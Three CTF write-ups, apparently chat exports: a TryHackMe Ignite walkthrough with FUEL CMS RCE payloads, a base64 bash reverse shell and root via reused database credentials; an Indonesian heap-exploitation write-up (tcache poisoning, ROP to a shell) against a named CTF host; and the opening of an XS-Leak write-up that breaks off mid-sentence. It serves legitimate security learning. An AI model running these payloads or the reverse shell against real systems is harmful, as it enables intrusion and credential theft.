## CHAT 13
[tuwalk.md](https://github.com/user-attachments/files/27439822/tuwalk.md)
# TryHackMe Ignite - Professional CTF Write-up

> **Mode:** Authorized CTF / Lab environment only  
> **Target:** TryHackMe private machine `Ignite`  
> **Primary vulnerability:** FUEL CMS 1.4.x Pre-Auth Remote Code Execution  
> **CVE:** CVE-2018-16763  
> **Author:** Reylucha Biel  
> **Note:** This write-up is for education, defensive learning, and authorized lab practice only. Do not run these techniques against systems you do not own or do not have explicit permission to test.

---

## 1. Executive Summary

Ignite is a beginner-friendly web exploitation room focused on identifying a vulnerable CMS, validating remote code execution, obtaining a reverse shell as the web server user, and escalating privileges by recovering credentials from application configuration files.

The attack path was:

```text
Recon -> Web fingerprinting -> FUEL CMS 1.4 discovery -> CVE-2018-16763 RCE -> Reverse shell as www-data -> Local enumeration -> Database config credential reuse -> root
```

The critical lesson from this room is to avoid chasing every noisy CVE from automated scans. The real path was visible from the web application banner: **FUEL CMS Version 1.4**.

---

## 2. Scope and Ethics

This assessment was performed only inside the TryHackMe lab environment. The target IP was assigned by TryHackMe, and the objective was to retrieve the user and root flags as part of a legal CTF exercise.

Rules followed:

- No third-party systems were targeted.
- No persistence was installed.
- No destructive commands were executed.
- Flags are redacted from screenshots in this public-style write-up.
- Commands are provided for reproducibility inside the authorized lab only.

---

## 3. Initial Room Context

The room objective is simple: root the box and submit `User.txt` and `Root.txt`.

![TryHackMe Ignite room overview](tuwalk_assets/01-room-overview.png)

![TryHackMe Ignite task panel](tuwalk_assets/02-room-task.png)

---

## 4. Reconnaissance

### 4.1 Nmap Scan

Command used:

```bash
sudo nmap -sC -sV --script vuln 10.49.132.213
```

Important findings:

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

http-enum:
  /robots.txt
  /0/
  /home/
  /index/
```

Interpretation:

- Only port `80/tcp` was open.
- The machine exposed a web application over HTTP.
- The Apache CVE output was noisy and should not be treated as the first exploit path.
- Web application fingerprinting became the next priority.

---

## 5. Web Application Fingerprinting

Opening the target in the browser showed a FUEL CMS landing page.

![FUEL CMS homepage and DevTools evidence](tuwalk_assets/03-fuel-home-devtools.png)

The page clearly identified:

```text
Welcome to Fuel CMS
Version 1.4
```

The page source also revealed the admin path and default credentials:

```text
Admin path: /fuel
Username: admin
Password: admin
```

I also confirmed that the admin dashboard could be reached through the web interface.

![FUEL CMS dashboard](tuwalk_assets/04-fuel-dashboard.png)

At this point the target technology was clear: **FUEL CMS 1.4**.

---

## 6. Vulnerability Research

Searching for `fuel cms 1.4 cve` led to **CVE-2018-16763**.

![CVE research for FUEL CMS 1.4](tuwalk_assets/05-cve-research.png)

Vulnerability summary:

```text
FUEL CMS 1.4.1 allows PHP Code Evaluation via the pages/select/ filter parameter or the preview/ data parameter.
This can lead to Pre-Auth Remote Code Execution.
```

The vulnerable endpoint used in this room:

```text
/fuel/pages/select/?filter=
```

The exploit idea is to inject PHP logic that eventually calls an operating system command through `system()`.

---

## 7. Remote Code Execution Verification

Before attempting a shell, I verified command execution with a harmless command.

Set the target variable:

```bash
export TARGET="http://10.49.132.213"
```

RCE verification command:

```bash
curl -sG "$TARGET/fuel/pages/select/" \
  --data-urlencode "filter='+pi(print(\$a='system'))+\$a('id')+'"
```

Successful output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![RCE verification output](tuwalk_assets/06-rce-verification.png)

The PHP warning shown in the response did not mean the exploit failed. The important part was that the `id` command executed successfully and returned the `www-data` identity.

Operational note:

```text
If $TARGET is empty in the current terminal session, the curl command will not hit the intended target.
Always confirm with: echo "$TARGET"
```

---

## 8. Reverse Shell

### 8.1 Find the VPN callback IP

The reverse shell must connect back to the attacker's TryHackMe VPN IP.

```bash
ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
```

A more reliable route-based check:

```bash
ip route get 10.49.132.213
```

Use the IP shown after `src`.

### 8.2 Start Listener

In terminal 1:

```bash
nc -lvnp 4444
```

### 8.3 Trigger Reverse Shell

In terminal 2:

```bash
export TARGET="http://10.49.132.213"

REV=$(printf 'bash -i >& /dev/tcp/YOUR_TUN0_IP/4444 0>&1' | base64 -w0)

curl -sG "$TARGET/fuel/pages/select/" \
  --data-urlencode "filter='+pi(print(\$a='system'))+\$a('echo $REV | base64 -d | bash')+'"
```

Successful shell:

```text
Connection received on 10.49.132.213
bash: cannot set terminal process group ...
bash: no job control in this shell
www-data@ubuntu:/var/www/html$
```

![Reverse shell as www-data](tuwalk_assets/07-reverse-shell.png)

The warning about terminal job control is normal for a raw reverse shell.

---

## 9. Initial Post-Exploitation Enumeration

Confirm the current user and context:

```bash
whoami
hostname
id
pwd
```

Expected identity:

```text
www-data
```

Useful initial checks:

```bash
ls -la
cat robots.txt
cat index.php
```

The web root confirmed the FUEL CMS installation structure:

```text
/var/www/html
assets/
fuel/
index.php
robots.txt
```

---

## 10. User Flag

Search for user-accessible flag files:

```bash
find /home -maxdepth 4 -type f \( -name "user.txt" -o -name "flag.txt" \) 2>/dev/null
```

The user flag was located under the `www-data` home directory:

```bash
cd /home/www-data
ls
cat flag.txt
```

![User flag retrieval redacted](tuwalk_assets/08-user-flag-redacted.png)

Flag value is intentionally redacted in this write-up.

---

## 11. Privilege Escalation Enumeration

Because this was a CMS-backed web application, application configuration files were the most interesting local target.

Move to the FUEL CMS config directory:

```bash
cd /var/www/html/fuel/application/config
ls
```

Search quickly for database-related credentials:

```bash
grep -n "hostname\|username\|password\|database" database.php
```

Interesting result:

```php
'hostname' => 'localhost',
'username' => 'root',
'password' => 'mememe',
'database' => 'fuel_schema',
```

![Database configuration discovery](tuwalk_assets/09-db-config.png)

Why this matters:

- Web applications often store database credentials in readable config files.
- In CTF environments, credentials are commonly reused across services or local users.
- The database password became a candidate password for `root`.

---

## 12. Root Access

Attempt to switch user to root:

```bash
su root
```

Password used:

```text
mememe
```

Confirm root access:

```bash
whoami
id
```

Expected result:

```text
root
```

Read the root flag:

```bash
cd /root
ls
cat root.txt
```

![Root flag retrieval redacted](tuwalk_assets/10-root-flag-redacted.png)

Flag value is intentionally redacted in this write-up.

---

## 13. Attack Chain Recap

```text
1. Scan target with Nmap.
2. Identify only HTTP service on port 80.
3. Inspect website manually.
4. Discover FUEL CMS Version 1.4.
5. Research known vulnerabilities.
6. Identify CVE-2018-16763.
7. Verify RCE with id command.
8. Generate base64 reverse shell payload.
9. Catch shell as www-data.
10. Enumerate /home and retrieve user flag.
11. Inspect CMS config files.
12. Find database password in database.php.
13. Reuse password with su root.
14. Retrieve root flag.
```

---

## 14. Common Pitfalls and Fixes

### Problem: Reverse shell does not connect back

Checklist:

```bash
echo "$TARGET"
ip route get 10.49.132.213
nc -lvnp 4444
```

Common causes:

- `$TARGET` was not exported in the same terminal session.
- Wrong VPN IP was used.
- Listener was not running before triggering the payload.
- Port mismatch between payload and listener.

### Problem: PHP warning appears during RCE test

If the output still contains this:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

then command execution worked. The PHP warning is not the primary signal; command output is.

### Problem: `sudo su` fails

This is expected because `www-data` usually does not have sudo privileges.

Use:

```bash
su root
```

Then enter the recovered password from `database.php`.

---

## 15. Defensive Recommendations

If this were a real environment, the following fixes would be required:

1. **Upgrade FUEL CMS** to a patched version.
2. **Remove default credentials** such as `admin:admin`.
3. **Do not reuse database passwords** for system accounts.
4. **Restrict config file permissions** so the web server cannot read unnecessary secrets.
5. **Disable verbose PHP errors** in production.
6. **Harden Apache and PHP** with least privilege and secure runtime settings.
7. **Monitor suspicious requests** to endpoints such as `/fuel/pages/select/`.
8. **Rotate exposed credentials** after compromise.

---

## 16. Key Lessons Learned

- Manual web fingerprinting is often more valuable than noisy vulnerability scanner output.
- Version banners can be critical in CTF-style exploitation.
- Always verify RCE with a harmless command before launching a shell.
- Environment variables such as `$TARGET` are terminal-session specific.
- Post-exploitation enumeration should prioritize application config files.
- Credential reuse is a common privilege escalation path in labs and real incidents.

---

## 17. Final Notes

This room demonstrates a clean web exploitation path from unauthenticated RCE to root. The most important professional habit is not the exploit itself, but the methodology:

```text
Observe carefully, validate assumptions, exploit minimally, enumerate systematically, and document clearly.
```

## CHAT 14
Aku percaya kok, Reylucha Biel. Kamu jelas konteksnya CTF/lab, dan dari alur sebelumnya kamu benar-benar sedang belajar PWN dengan cara yang sehat: memahami bug, leak, heap, libc, stack, sampai ROP. Jadi kita fokus ke edukasi dan writeup profesionalnya.

Di bawah ini aku buatkan **writeup lengkap** dari challenge `quick — Heap Sort Lab`.

---

# CTF Writeup — quick: Heap Sort Lab

## Challenge Information

**Category:** PWN / Binary Exploitation
**Challenge Name:** quick
**Target:** `pwn.cbd2026.cloud:5000`
**Binary:** `quick`
**Final Flag:**

```text
CBC{this_should_be_very_qu1ck_isn't?_19fcad}
```

## Executive Summary

Challenge ini adalah program menu sederhana bernama **Heap Sort Lab**. User bisa membuat slot angka, melihat angka yang sudah diurutkan, mengubah slot, menghapus slot, lalu keluar.

Bug utamanya ada pada **integer overflow saat menghitung ukuran alokasi heap**. Program percaya kita membuat array super besar, tetapi karena perhitungan ukuran overflow, `malloc()` justru hanya membuat chunk kecil. Akibatnya, slot tersebut bisa dipakai untuk membaca dan menulis melewati batas heap chunk normal.

Dengan bug ini, kita membangun exploit bertahap:

```text
Integer overflow
→ Out-of-bounds heap read/write
→ Heap leak
→ Libc leak dari unsorted bin
→ Tcache poisoning
→ Leak stack dari environ
→ Overwrite saved RIP
→ ROP chain system("/bin/sh")
→ Shell
→ Read flag
```

---

# Phase 1 — Reconnaissance

## Goal

Pada tahap awal, kita ingin memahami:

1. Program melakukan apa?
2. Fitur apa yang tersedia?
3. Proteksi binary apa saja?
4. Ada bug input, heap, stack, atau format string?

Saat dijalankan, remote menampilkan menu:

```text
=== Heap Sort Lab ===
1) Create slot
2) View sorted values
3) Update slot values
4) Delete slot
5) Exit
Select option:
```

Ini langsung memberi sinyal bahwa challenge berkaitan dengan **heap management**, karena ada fitur:

```text
Create
View
Update
Delete
```

Dalam PWN, kombinasi ini sering berarti:

```text
malloc
read/write data
free
reuse memory
```

## ELI5 Analogy

Bayangkan program ini seperti **rak penyimpanan kotak angka**.

Kita bisa:

```text
Create  = beli kotak baru
View    = lihat isi kotak
Update  = ganti isi kotak
Delete  = buang kotak
Exit    = keluar dari gudang
```

Kalau penjaga gudang salah menghitung ukuran kotak, kita bisa melihat atau mengubah isi kotak tetangga.

---

# Phase 2 — Vulnerability Analysis

## Main Bug: Integer Overflow

Program menerima jumlah angka dari user. Misalnya user bilang ingin membuat `n` angka. Program lalu menghitung ukuran alokasi kira-kira seperti ini:

```c
size = n * 8;
malloc(size);
```

Karena setiap angka bertipe `unsigned long`, ukurannya 8 byte.

Masalahnya: kalau `n` terlalu besar, operasi:

```c
n * 8
```

bisa overflow.

Nilai yang dipakai:

```python
BIG = (1 << 61) + 2
```

Saat dikali 8:

```text
BIG * 8
```

hasilnya meluap dan berputar balik menjadi ukuran kecil, sekitar `0x10`.

Jadi program mengira:

```text
Slot ini punya jumlah angka sangat besar.
```

Padahal heap chunk yang dibuat:

```text
kecil sekali.
```

## ELI5 Analogy

Bayangkan kamu pesan gudang super besar:

```text
“Saya mau gudang untuk 2 triliun kardus.”
```

Tapi kalkulator petugasnya error. Setelah menghitung, dia malah berkata:

```text
“Oh, cukup lemari kecil saja.”
```

Akhirnya kamu punya lemari kecil, tetapi di catatan sistem tertulis:

```text
“Ini gudang super panjang.”
```

Saat kamu minta lihat isi gudang, sistem membaca bukan cuma lemari kamu, tapi juga barang-barang di sebelahnya.

Itulah konsep **out-of-bounds read/write**.

---

# Phase 3 — Heap Layout Setup

## Goal

Kita butuh menata heap supaya data penting berada di sekitar slot overflow.

Exploit membuat slot 0 dengan ukuran palsu besar:

```python
create(0, BIG, [-1])
```

`-1` dipakai sebagai sentinel agar input angka berhenti.

Lalu kita membuat beberapa slot normal:

```python
for i in range(1, 10):
    create(i, 32, [...])
```

Kenapa `32`?

Karena:

```text
32 angka × 8 byte = 0x100
```

Dengan metadata heap, ukuran chunk menjadi sekitar:

```text
0x110
```

Ukuran ini penting karena masuk ke jalur tcache/unsorted bin tertentu.

## Thought Process

Kenapa kita menata heap dulu?

Karena eksploitasi heap itu seperti menyusun domino. Kalau posisi chunk acak, leak tidak stabil. Kita ingin chunk berada dalam susunan yang bisa diprediksi.

Tujuan kita:

```text
slot 0 = chunk kecil tapi dianggap besar
slot 1-8 = chunk target untuk tcache dan unsorted bin
slot 9 = guard supaya chunk tidak merge ke top chunk
```

## ELI5 Analogy

Bayangkan kita sedang menyusun kotak di rak.

Kita taruh:

```text
Kotak 0 = kotak ajaib yang bisa “melihat jauh”
Kotak 1-8 = kotak eksperimen
Kotak 9 = pembatas ujung rak
```

Pembatas penting agar kotak sebelumnya tidak menyatu dengan ruang kosong besar di belakang rak.

---

# Phase 4 — Libc Leak via Unsorted Bin

## Goal

Kita butuh tahu alamat libc di memory remote.

Kenapa?

Karena binary memakai ASLR. Alamat fungsi seperti:

```text
system()
"/bin/sh"
environ
```

berubah setiap kali program jalan.

Untuk memanggil `system("/bin/sh")`, kita harus tahu libc base dulu.

## Technique

Kita free beberapa chunk ukuran `0x110`.

Tcache untuk size tertentu hanya bisa menampung 7 chunk. Jadi kita isi tcache dulu:

```python
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
delete(7)
delete(1)
```

Setelah tcache penuh, kita free slot 8:

```python
delete(8)
```

Karena tcache penuh, chunk slot 8 masuk ke **unsorted bin**.

Chunk di unsorted bin menyimpan pointer ke `main_arena`, yang berada di libc. Dari pointer ini kita hitung libc base.

## ELI5 Analogy

Tcache itu seperti **keranjang kecil barang bekas**.

Keranjang hanya muat 7 barang.

Kalau barang ke-8 dibuang, dia tidak masuk keranjang kecil lagi. Dia dikirim ke **gudang besar pusat**.

Di gudang besar itu ada label alamat kantor pusat. Dari label itu kita bisa tahu lokasi seluruh gedung libc.

---

# Phase 5 — Heap Leak and Safe-Linking

## Goal

Kita butuh alamat heap untuk mengalahkan **safe-linking**.

Modern glibc melindungi pointer tcache dengan rumus:

```c
stored_fd = real_fd ^ (chunk_address >> 12)
```

Artinya pointer tidak disimpan mentah, tetapi “dikunci” dengan XOR.

Untuk melakukan tcache poisoning, kita perlu tahu:

```python
heap_shift = heap_address >> 12
```

Dari out-of-bounds read slot 0, kita leak metadata tcache, lalu mendapatkan:

```text
slot1_user
heap_shift
```

Contoh output exploit:

```text
[+] slot1_user     : 0x5b66947cd2c0
[+] heap_shift     : 0x5b66947cd
```

## ELI5 Analogy

Safe-linking itu seperti alamat rumah yang ditulis dalam kode rahasia.

Kalau alamat asli:

```text
Jl. Mawar No. 10
```

sistem menyimpannya sebagai:

```text
Kode rahasia hasil campuran alamat + kunci
```

Agar bisa memalsukan alamat, kita harus tahu kuncinya dulu. Dalam exploit ini, kuncinya adalah:

```text
heap_address >> 12
```

---

# Phase 6 — Tcache Poisoning

## Goal

Setelah tahu heap key, kita bisa memalsukan linked list tcache agar `malloc()` mengembalikan pointer ke alamat yang kita mau.

Ini disebut **tcache poisoning**.

Target pertama kita adalah `environ`.

Kenapa `environ`?

Karena `environ` adalah symbol libc yang menyimpan pointer ke stack.

Kalau kita bisa baca `environ`, kita bisa tahu alamat stack.

## Python Logic

Secara konsep:

```python
encoded_target = target ^ heap_shift
```

Lalu kita overwrite tcache fd dengan:

```python
encoded_target
```

Setelah itu, `malloc()` berikutnya akan diarahkan ke alamat target.

## Why It Matters

Tanpa stack leak, kita tidak tahu di mana saved return address berada.

Dengan stack leak, kita bisa menghitung:

```python
saved_rip = stack_leak - STACK_RET_DELTA
```

## ELI5 Analogy

Tcache itu seperti antrean kotak kosong.

Normalnya:

```text
Ambil kotak A
lalu kotak B
lalu kotak C
```

Tcache poisoning membuat kita mengubah daftar antrean:

```text
Ambil kotak A
lalu ambil “kotak palsu” di alamat yang kita pilih
```

Seperti menyelipkan alamat palsu di daftar pengambilan barang.

---

# Phase 7 — Stack Leak via environ

## Goal

Kita membaca `environ` untuk mendapatkan alamat stack.

Output exploit:

```text
[+] environ        : 0x7ef9801b7d58
[+] stack leak     : 0x7ffc80d87868
```

Alamat stack biasanya berbentuk:

```text
0x7ffc...
```

Jadi ketika kita melihat:

```text
0x7ffc80d87868
```

itu valid sebagai stack leak.

## Thought Process

Setelah tahu libc base, kita bisa hitung alamat `environ`:

```python
environ_addr = libc_base + environ_offset
```

Lalu dengan arbitrary read hasil tcache poisoning, kita baca isi `environ`.

## ELI5 Analogy

Bayangkan libc adalah gedung kantor. `environ` adalah papan informasi yang berkata:

```text
“Orang yang kamu cari sedang berada di lantai stack, dekat ruangan ini.”
```

Jadi `environ` bukan saved RIP, tapi dia memberi kita petunjuk lokasi stack.

---

# Phase 8 — Finding Saved RIP

## Goal

Saved RIP adalah alamat yang akan dipakai CPU saat fungsi selesai.

Kalau kita overwrite saved RIP, kita bisa mengubah alur program.

Exploit menghitung:

```python
saved_rip = stack_leak - STACK_RET_DELTA
```

Awalnya lokal berhasil dengan:

```text
STACK_RET_DELTA=0x120
```

Tetapi remote butuh:

```text
STACK_RET_DELTA=0x130
```

Final command:

```bash
UNSORTED_OFF=0x203b20 STACK_RET_DELTA=0x130 python3 solve_quick_v3.py pwn.cbd2026.cloud 5000
```

## Why Delta Can Differ

Stack layout bisa berbeda antara lokal dan remote karena:

```text
environment variable
argv
cara service dijalankan
libc/runtime
wrapper dari server CTF
```

Beda `0x10` itu normal.

## ELI5 Analogy

`environ` memberi tahu kita:

```text
“Kamu ada di sekitar rumah target.”
```

Tapi untuk menemukan pintu utama, kita harus mundur beberapa langkah.

Di lokal:

```text
mundur 0x120 langkah
```

Di remote:

```text
mundur 0x130 langkah
```

---

# Phase 9 — ROP Chain

## Goal

Kita ingin menjalankan:

```c
system("/bin/sh")
```

Untuk itu kita butuh:

```text
ret
pop rdi; ret
alamat string "/bin/sh"
alamat system()
```

Pada arsitektur x86_64 Linux, argumen pertama fungsi masuk ke register `RDI`.

Jadi untuk memanggil:

```c
system("/bin/sh")
```

kita harus membuat:

```text
RDI = alamat "/bin/sh"
RIP = system
```

ROP chain:

```text
ret
pop rdi; ret
/bin/sh
system
```

## Output Exploit

```text
[+] ret            : 0x7ef9800bc78c
[+] pop rdi; ret   : 0x7ef9800bc78b
[+] /bin/sh        : 0x7ef98017842f
[+] system         : 0x7ef980005750
```

## ELI5 Analogy

ROP chain itu seperti mengganti rute perjalanan robot.

Normalnya robot setelah selesai kerja pulang ke rumah.

Kita ubah catatan rutenya:

```text
1. Rapikan posisi badan dulu
2. Ambil tulisan "/bin/sh"
3. Bawa tulisan itu ke system()
4. Jalankan shell
```

---

# Phase 10 — Final Exploit Execution

Command final:

```bash
UNSORTED_OFF=0x203b20 STACK_RET_DELTA=0x130 python3 solve_quick_v3.py pwn.cbd2026.cloud 5000
```

Output sukses:

```text
[*] libc path      : /lib/x86_64-linux-gnu/libc.so.6
[*] unsorted leak  : 0x203b20
[*] stack delta    : 0x130
[+] slot1_user     : 0x5b66947cd2c0
[+] heap_shift     : 0x5b66947cd
[+] libc leak      : 0x7ef9801b0b20
[+] libc base      : 0x7ef97ffad000
[+] environ        : 0x7ef9801b7d58
[+] stack leak     : 0x7ffc80d87868
[+] saved RIP      : 0x7ffc80d87738
[+] fake chunk @   : 0x7ffc80d87730
[+] ret            : 0x7ef9800bc78c
[+] pop rdi; ret   : 0x7ef9800bc78b
[+] /bin/sh        : 0x7ef98017842f
[+] system         : 0x7ef980005750
Goodbye!
[shell ok]
CBC{this_should_be_very_qu1ck_isn't?_19fcad}
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
```

---

# Python Exploit Dissection

## 1. Environment Variables

Exploit memakai:

```bash
UNSORTED_OFF=0x203b20
STACK_RET_DELTA=0x130
```

Kenapa dibuat environment variable?

Agar exploit fleksibel. Kalau libc remote beda atau stack layout beda, kita tidak perlu edit script, cukup ganti command.

```python
UNSORTED_OFF = int(os.getenv("UNSORTED_OFF", "0x203b20"), 16)
STACK_RET_DELTA = int(os.getenv("STACK_RET_DELTA", "0x120"), 16)
```

Analogi:

```text
Script = mobil
Environment variable = setelan kursi dan spion
```

Mobilnya sama, tapi setelan bisa disesuaikan dengan jalan remote.

---

## 2. Connection Handler

Script membuat koneksi ke remote:

```python
sock = socket.create_connection((host, port))
```

Lalu membuat helper:

```python
recvuntil()
sendline()
```

Kenapa perlu helper?

Karena program berbasis menu. Kita harus sinkron dengan prompt:

```text
Select option:
Index:
Number of values:
space-separated:
```

Analogi:

```text
Kita bicara dengan kasir.
Tunggu kasir tanya.
Baru jawab.
Jangan jawab sebelum ditanya.
```

---

## 3. Menu Wrappers

Exploit membuat fungsi seperti:

```python
create(index, count, values)
view(index)
update(index, values)
delete(index)
```

Kenapa?

Agar exploit logic mudah dibaca.

Daripada menulis manual:

```python
sendline("1")
sendline("0")
sendline(str(BIG))
...
```

lebih rapi:

```python
create(0, BIG, [-1])
```

Analogi:

```text
Daripada setiap kali menjelaskan “jalan ke dapur, ambil gelas, isi air”,
kita buat shortcut: ambil_air().
```

---

## 4. Creating the Overflow Slot

```python
BIG = (1 << 61) + 2
create(0, BIG, [-1])
```

Ini adalah inti bug.

Tujuannya membuat:

```text
logical size besar
real malloc kecil
```

Slot 0 nanti menjadi “kamera” untuk membaca heap sekitar.

---

## 5. Heap Grooming

```python
for i in range(1, 10):
    create(i, 32, payload)
```

Tujuannya menata chunk agar predictable.

Analogi:

```text
Sebelum menjatuhkan domino, kita harus susun domino dengan rapi.
```

---

## 6. Filling Tcache and Creating Unsorted Bin Leak

```python
for i in [2,3,4,5,6,7,1,8]:
    delete(i)
```

Urutan ini penting.

Tcache diisi dulu dengan 7 chunk. Chunk berikutnya masuk unsorted bin.

Dari unsorted bin, kita leak libc.

---

## 7. Calculating libc Base

```python
libc_base = libc_leak - UNSORTED_OFF
```

Remote sukses dengan:

```text
UNSORTED_OFF=0x203b20
```

Kenapa kita tahu offset benar?

Karena hasil libc base:

```text
0x7ef97ffad000
```

berakhir `000`, page-aligned.

Kalau hasilnya seperti:

```text
...f00
```

berarti offset salah.

---

## 8. Arbitrary Read via Tcache Poisoning

Konsep:

```python
encoded_target = target ^ heap_shift
```

Lalu kita arahkan malloc ke target.

Target pertama:

```python
environ
```

Tujuan:

```text
leak stack
```

---

## 9. Saved RIP Calculation

```python
saved_rip = stack_leak - STACK_RET_DELTA
```

Remote membutuhkan:

```text
STACK_RET_DELTA=0x130
```

Kenapa brute force delta wajar?

Karena kita tahu target berada dekat stack leak. Kita hanya perlu mencari offset kecil yang benar.

---

## 10. Writing ROP Chain

ROP chain ditulis ke stack:

```python
[
    ret,
    pop_rdi_ret,
    bin_sh,
    system
]
```

Saat user memilih menu Exit, fungsi `main` return dan CPU menjalankan chain kita.

---

# Why the Loop Failed but Manual Worked

Loop awal:

```bash
timeout 8 python3 solve_quick_v3.py ...
```

terlalu agresif.

Exploit ini melakukan banyak tahap:

```text
connect
create banyak slot
delete banyak slot
leak heap
leak libc
poison tcache
leak stack
poison lagi
write ROP
exit
read flag
```

Kadang remote delay. Kalau `timeout 8` memotong proses sebelum selesai, delta yang benar pun terlihat gagal.

Loop lebih baik:

```bash
for d in 0x100 0x110 0x120 0x130 0x140 0x150; do
  echo "===== TRY STACK_RET_DELTA=$d ====="
  out=$(UNSORTED_OFF=0x203b20 STACK_RET_DELTA=$d timeout 20 python3 solve_quick_v3.py pwn.cbd2026.cloud 5000 2>&1)
  echo "$out"
  echo "$out" | grep -q 'CBC{' && break
done
```

---

# Backup Plan and Pivot Strategy

Kalau exploit gagal, proses berpikirnya begini:

## Case 1 — Crash sebelum leak libc

Kemungkinan:

```text
heap grooming salah
prompt parser salah
integer overflow tidak bekerja
remote binary beda
```

Pivot:

```text
cek nc manual
cek menu prompt
kurangi asumsi
tambahkan timeout dan debug tail
```

## Case 2 — libc base tidak page-aligned

Contoh buruk:

```text
libc base = ...f00
```

Artinya:

```text
UNSORTED_OFF salah
```

Pivot:

```text
cari offset yang membuat libc_base berakhir 000
```

Dalam kasus ini:

```text
0x203b20
```

berhasil.

## Case 3 — stack leak valid tapi shell tidak muncul

Artinya:

```text
libc sudah benar
environ sudah benar
stack sudah benar
saved RIP meleset
```

Pivot:

```text
brute force STACK_RET_DELTA sekitar nilai lokal
```

Remote berhasil dengan:

```text
0x130
```

## Case 4 — shell muncul tapi flag tidak keluar

Kemungkinan:

```text
command cat salah
flag beda path
shell belum interaktif
```

Pivot:

```bash
id
pwd
ls -la
cat flag*
cat /home/*/flag*
```

---

# Professional Lessons Learned

## 1. Integer Overflow Can Become Heap Corruption

Bug sederhana pada perhitungan ukuran:

```c
n * sizeof(type)
```

bisa sangat berbahaya jika tidak dicek overflow.

Mitigation:

```c
if (n > SIZE_MAX / sizeof(unsigned long)) {
    reject_input();
}
```

## 2. Heap Exploitation Is About Layout Control

Exploit tidak langsung “magic”. Kita harus mengatur heap agar chunk berada pada posisi yang kita inginkan.

## 3. Modern glibc Requires Leak Chaining

Karena ada ASLR dan safe-linking, exploit modern biasanya butuh beberapa leak:

```text
heap leak
libc leak
stack leak
```

## 4. Remote Exploitation Needs Adaptation

Offset lokal belum tentu sama dengan remote.

Dalam challenge ini:

```text
local STACK_RET_DELTA  = 0x120
remote STACK_RET_DELTA = 0x130
```

## 5. Good Exploit Scripts Should Be Adjustable

Environment variable seperti ini sangat membantu:

```bash
UNSORTED_OFF=...
STACK_RET_DELTA=...
```

Karena exploit bisa cepat dipivot tanpa edit source code.

---

# Final Command

```bash
UNSORTED_OFF=0x203b20 STACK_RET_DELTA=0x130 python3 solve_quick_v3.py pwn.cbd2026.cloud 5000
```

# Final Flag

```text
CBC{this_should_be_very_qu1ck_isn't?_19fcad}
```

---

# Simple Mental Model

Kalau diringkas seperti cerita anak-anak:

Program ini adalah gudang kotak angka.

Kita menemukan penjaga gudang punya kalkulator rusak. Kita bilang mau kotak super besar, tapi dia hanya memberi kotak kecil. Karena catatan sistem tetap bilang kotaknya besar, kita bisa mengintip kotak sebelah.

Dari kotak sebelah, kita menemukan alamat gudang besar libc. Setelah tahu alamat libc, kita cari papan petunjuk bernama `environ` untuk menemukan lokasi stack. Setelah tahu stack, kita cari catatan “alamat pulang” program. Lalu kita ganti alamat pulangnya supaya saat program keluar, dia tidak pulang biasa, tetapi menjalankan:

```text
system("/bin/sh")
```

Shell muncul, lalu flag terbaca.

That is the full exploitation flow.


## CHAT 15
Bestie Reylucha Biel, kamu **nggak salah minta**. Ini aman untuk konteks CTF/lab, dan aku akan bantu kamu memahami **alur berpikirnya**, bukan cuma “copy script lalu dapet flag”.

Di bawah ini aku buatkan versi **Professional CTF Writeup + Mentor Explanation** yang bisa kamu pakai untuk belajar, portfolio, atau dirapikan lagi ke GitHub.

---

# Wonder 1000 Nyxmare — CTF Web Writeup

**Player:** Reylucha Biel
**Category:** Web Exploitation
**Challenge:** Wonder 1000 Nyxmare / Wonder PDFs
**Target:** `https://wonder.cbd2026.cloud/`
**Final Flag:**

```text
CBC{4efd3d8c2a6358493c484bdeb1e31d89}
```

---

# 1. Executive Summary

Challenge ini adalah web app untuk upload dan search PDF. Secara tampilan, fiturnya terlihat normal:

```text
Register
Login
Upload PDF
Search PDF
Report URL
```

Namun setelah source code dianalisis, ditemukan bahwa **flag disimpan sebagai title PDF private milik admin**. Kita sebagai user biasa tidak bisa membaca PDF private admin secara langsung.

Vulnerability utama yang dieksploitasi adalah **XS-Leak melalui iframe counting**. Dengan memanfaatkan fitur `/report`, admin bot membuka halaman exploit yang kita host sendiri. Halaman exploit tersebut membuat browser admin melakukan pencarian ke aplikasi internal, lalu mendeteksi apakah hasil search memiliki iframe atau tidak.

Dari sinilah flag bisa diekstrak **satu karakter demi satu karakter**.

Flow sederhananya:

```text
Admin punya PDF private
Title PDF admin = flag
Search akan menampilkan iframe kalau hasil ditemukan
Admin bot bisa disuruh membuka URL kita lewat /report
Halaman kita membuka /search?q=<tebakan>
Kalau iframe muncul, tebakan benar
Ulangi sampai flag lengkap
```

Analogi besarnya:

> Admin punya buku rahasia. Kita tidak boleh membaca isi buku itu. Tapi kalau kita menebak sebagian judul buku dengan benar, sistem perpustakaan menyalakan lampu kecil. Kita tidak membaca bukunya, tapi kita melihat “lampu menyala atau tidak” untuk menebak judulnya pelan-pelan.

---

# 2. Mindset Awal: Bagaimana Cara Berpikirnya?

Saat melihat challenge Web CTF, jangan langsung berpikir:

```text
Harus inject SQL
Harus XSS
Harus brute force login
```

Lebih baik mulai dari pertanyaan:

```text
Apa fitur utama aplikasi?
Di mana data rahasia mungkin disimpan?
Siapa yang punya akses ke data rahasia?
Apakah ada fitur yang membuat admin/bot membuka input kita?
Apakah ada perbedaan respons yang bisa kita ukur?
```

Pada challenge ini, fitur yang paling mencurigakan adalah:

```text
/report
```

Dalam CTF Web, fitur report hampir selalu berarti:

```text
Ada admin bot
Admin bot login sebagai privileged user
Admin bot akan membuka URL dari peserta
Mungkin ada XSS, CSRF, XS-Leak, atau browser-side bug
```

Jadi sejak awal, mindset kita:

> Kalau ada fitur report, kemungkinan besar kita harus membuat halaman yang dikunjungi admin bot, lalu memanfaatkan browser admin sebagai “alat pembaca data”.

---

# 3. Phase 1 — Reconnaissance

## 3.1 Observasi Aplikasi

Dari tampilan aplikasi, kita melihat fitur umum:

```text
Home
Upload PDF
Search
Report
Login/Register
```

Secara normal, user hanya bisa melihat PDF miliknya sendiri atau PDF public.

Checkpoint awal:

```text
Aplikasi punya konsep user
Aplikasi punya PDF private/public
Aplikasi punya search
Aplikasi punya report bot
```

Kenapa ini penting?

Karena kombinasi berikut sangat berbahaya:

```text
